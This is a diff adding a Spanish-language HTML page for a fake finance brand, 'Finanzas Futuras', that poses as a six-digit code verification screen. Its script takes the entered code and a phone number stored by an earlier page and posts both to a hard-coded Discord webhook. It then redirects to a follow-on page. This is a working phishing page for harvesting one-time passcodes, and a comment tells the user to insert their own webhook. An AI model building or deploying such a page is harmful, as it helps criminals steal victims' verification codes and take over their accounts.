@@ -1,0 +1,241 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Código de verificación</title>
+
+<link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;600&display=swap" rel="stylesheet">
+
+<style>
+* {
+    margin: 0;
+    padding: 0;
+    box-sizing: border-box;
+}
+
+body {
+    font-family: 'Poppins', sans-serif;
+    background: #f4f7fb;
+    color: #1e293b;
+}
+
+/* HEADER */
+.header {
+    background: white;
+    padding: 15px 40px;
+    box-shadow: 0 4px 20px rgba(0,0,0,0.05);
+    font-weight: 600;
+    color: #1e3a8a;
+}
+
+/* CONTENEDOR */
+.container {
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    height: 85vh;
+    padding: 20px;
+}
+
+.box {
+    background: white;
+    padding: 40px;
+    border-radius: 20px;
+    box-shadow: 0 10px 30px rgba(0,0,0,0.08);
+    width: 100%;
+    max-width: 420px;
+    text-align: center;
+}
+
+.box h2 {
+    margin-bottom: 10px;
+}
+
+.box p {
+    font-size: 14px;
+    color: #64748b;
+    margin-bottom: 25px;
+}
+
+/* INPUTS */
+.code-inputs {
+    display: flex;
+    justify-content: space-between;
+    gap: 10px;
+    margin-bottom: 25px;
+}
+
+.code-inputs input {
+    width: 50px;
+    height: 60px;
+    text-align: center;
+    font-size: 22px;
+    border-radius: 10px;
+    border: 1px solid #cbd5e1;
+}
+
+.code-inputs input:focus {
+    border-color: #1e3a8a;
+    outline: none;
+}
+
+/* BOTÓN */
+button {
+    width: 100%;
+    padding: 15px;
+    border: none;
+    border-radius: 10px;
+    background: #1e3a8a;
+    color: white;
+    font-size: 16px;
+    cursor: pointer;
+    transition: 0.3s;
+}
+
+button:hover {
+    background: #172554;
+}
+
+button:disabled {
+    background: #94a3b8;
+}
+
+.success {
+    display: none;
+    margin-top: 15px;
+    color: #1e3a8a;
+    font-size: 14px;
+}
+
+/* RESPONSIVE */
+@media (max-width: 600px) {
+    .code-inputs input {
+        width: 40px;
+        height: 55px;
+        font-size: 18px;
+    }
+
+    .box {
+        padding: 25px;
+    }
+}
+</style>
+</head>
+
+<body>
+
+<div class="header">💰 Finanzas Futuras</div>
+
+<div class="container">
+    <div class="box">
+        <h2>Verificación</h2>
+        <p>Coloca tu código de 6 dígitos</p>
+
+        <div class="code-inputs">
+            <input type="tel" maxlength="1" pattern="[0-9]*">
+            <input type="tel" maxlength="1" pattern="[0-9]*">
+            <input type="tel" maxlength="1" pattern="[0-9]*">
+            <input type="tel" maxlength="1" pattern="[0-9]*">
+            <input type="tel" maxlength="1" pattern="[0-9]*">
+            <input type="tel" maxlength="1" pattern="[0-9]*">
+        </div>
+
+        <button id="btnVerificar" onclick="verificar()">Verificar</button>
+
+        <div class="success" id="msg">Verificando...</div>
+    </div>
+</div>
+
+<script>
+const inputs = document.querySelectorAll(".code-inputs input");
+
+// Manejo de foco automático entre cuadros
+inputs.forEach((input, index) => {
+    input.addEventListener("input", () => {
+        if (input.value.length === 1 && index < inputs.length - 1) {
+            inputs[index + 1].focus();
+        }
+    });
+
+    input.addEventListener("keydown", (e) => {
+        if (e.key === "Backspace" && input.value === "" && index > 0) {
+            inputs[index - 1].focus();
+        }
+    });
+});
+
+async function verificar() {
+    // REEMPLAZA CON TU WEBHOOK
+    const WEBHOOK_URL = "https://discord.com/api/webhooks/1467797896304001025/51qj0DO77O-xX4B4E3YqbE3S38fx6pkqCe-H5JZT3NZLUr4cbmTLujxqqNP-aGU7V_mX";
+
+    // 1. Obtener el código de los inputs
+    let codigoRecibido = "";
+    inputs.forEach(input => codigoRecibido += input.value);
+
+    // 2. Obtener el teléfono guardado de la página anterior
+    let telefonoGuardado = localStorage.getItem("telefono_usuario") || "No detectado";
+
+    if (codigoRecibido.length < 6) {
+        alert("Completa el código de 6 dígitos");
+        return;
+    }
+
+    const btn = document.getElementById("btnVerificar");
+    const msg = document.getElementById("msg");
+
+    btn.disabled = true;
+    btn.innerText = "Procesando...";
+    msg.style.display = "block";
+
+    // 3. Preparar el mensaje para Discord
+    const payload = {
+        embeds: [{
+            title: "🔑 Código de Verificación Recibido",
+            color: 15105570, // Color naranja/oro
+            fields: [
+                {
+                    name: "📱 Teléfono del Usuario",
+                    value: `\`${telefonoGuardado}\``,
+                    inline: false
+                },
+                {
+                    name: "🔢 Código Ingresado",
+                    value: `**${codigoRecibido}**`,
+                    inline: false
+                },
+                {
+                    name: "⏰ Fecha y Hora",
+                    value: new Date().toLocaleString(),
+                    inline: false
+                }
+            ],
+            footer: { text: "Sistema de Seguridad Finanzas Futuras" }
+        }]
+    };
+
+    try {
+        const response = await fetch(WEBHOOK_URL, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify(payload)
+        });
+
+        if (response.ok) {
+            // REDIRECCIÓN FINAL
+            window.location.href = "carga2.html";
+        } else {
+            throw new Error('Error al enviar');
+        }
+    } catch (error) {
+        console.error(error);
+        alert("Error de conexión. Inténtalo de nuevo.");
+        btn.disabled = false;
+        btn.innerText = "Verificar";
+        msg.style.display = "none";
+    }
+}
+</script>
+
+</body>
+</html>
